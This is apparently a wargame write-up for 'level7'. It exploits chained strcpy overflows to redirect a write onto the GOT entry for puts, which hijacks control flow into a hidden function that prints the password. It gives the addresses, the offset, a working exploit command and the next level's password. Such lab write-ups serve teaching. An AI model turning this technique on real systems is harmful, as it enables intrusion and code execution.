# Level 7 - GOT Overwrite via Strcpy Overflow

## Code Analysis

### Program Flow

The `main` function executes the following sequence:

1. Allocates memory for `argv[1]` and `argv[2]` using `malloc`
2. Copies `argv[1]` into the first buffer using `strcpy`
3. Copies `argv[2]` into the second buffer using `strcpy`
4. Reads the password file into a global variable `c` using `fgets`
5. Calls `puts` to print output

### Target Functions

**Function m:** Hidden function that prints the contents of global variable `c` (the password)

**Default behavior:** The program calls `puts` but never displays the password

### Exploitation Strategy

By overflowing the first `strcpy` call, we can overwrite the destination pointer of the second `strcpy`. This allows us to redirect the second copy operation to overwrite the **GOT entry for `puts`** with the address of function `m`.

## Finding Required Addresses

### Step 1: Address of Function m

**Address:** `0x080484f4`

**Little-endian:** `\xf4\x84\x04\x08`

### Step 2: Determining the Offset

Using `ltrace` to observe the strcpy operations:
```bash
ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag test
```

**Output:**
```
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)       = 0x0804a018
strcpy(0x37614136, NULL <unfinished ...>
```

The second `strcpy` destination pointer is overwritten with `0x37614136`. Decoding this with the pattern generator reveals an offset of **20 bytes**.

### Step 3: Finding the GOT Entry for Puts

#### Initial Approach (Incorrect)
```bash
gdb ./level7
info functions puts
```

This returns `0x08048400`, but this is the **PLT stub**, not the GOT entry.

#### Correct Approach

We need to find where the actual function pointer is stored:
```gdb
disass 0x08048400
```

**Output:**
```
0x08048400 <+0>:	jmp    *0x8049928
0x08048406 <+6>:	push   $0x28
0x0804840b <+11>:	jmp    0x80483a0
```

The first instruction jumps to the address stored at `0x8049928` - this is the **GOT entry** we need to overwrite.

**GOT address for puts:** `0x8049928`

**Little-endian:** `\x28\x99\x04\x08`

## Crafting the Exploit

### Payload Structure

**First argument (`argv[1]`):**
- 20 bytes of padding
- GOT address of `puts` (target for second strcpy)

**Second argument (`argv[2]`):**
- Address of function `m` (value to write into GOT)

### Verification with ltrace

Testing the overflow:
```bash
ltrace ./level7 $(python -c 'print "B" * 20 + "\x28\x99\x04\x08"') test
```

This confirms we can control the destination of the second `strcpy`.

### Final Exploit
```bash
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

**Execution flow:**
1. First `strcpy`: Overflows buffer and overwrites the destination pointer for the second `strcpy` with `0x8049928` (GOT entry for `puts`)
2. Second `strcpy`: Writes `0x080484f4` (address of function `m`) into the GOT entry for `puts`
3. When `puts` is called, it executes function `m` instead, which prints the password

## Retrieving the Password

The password is displayed automatically upon successful exploitation.

## Credentials

**Username:** level8  
**Password:** `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`

## Summary

This level demonstrates a sophisticated **two-stage exploitation technique** combining buffer overflow with GOT overwrite.

**Key concepts:**
- Chaining multiple `strcpy` vulnerabilities
- Overwriting destination pointers through buffer overflow
- Distinguishing between PLT stubs and GOT entries
- Understanding the relationship between dynamic linking structures
- Multi-argument exploitation requiring careful coordination
- Indirect control flow hijacking through function pointer manipulation

**Critical distinction:** Unlike direct GOT overwrites, this attack uses one overflow to control where a second overflow writes, demonstrating how multiple vulnerabilities can be chained for complex exploitation scenarios.